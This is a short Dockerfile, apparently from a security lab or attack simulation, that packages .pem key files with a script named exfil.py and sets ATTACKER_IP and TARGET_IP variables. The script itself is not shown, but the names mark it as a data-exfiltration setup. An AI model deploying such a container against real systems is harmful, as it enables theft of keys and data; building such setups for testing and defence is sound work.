FROM python:3.9-slim

WORKDIR /app

ENV ATTACKER_IP=10.37.1.249
ENV TARGET_IP=10.37.1.149

COPY *.pem exfil.py ./

CMD ["python", "-u", "exfil.py"]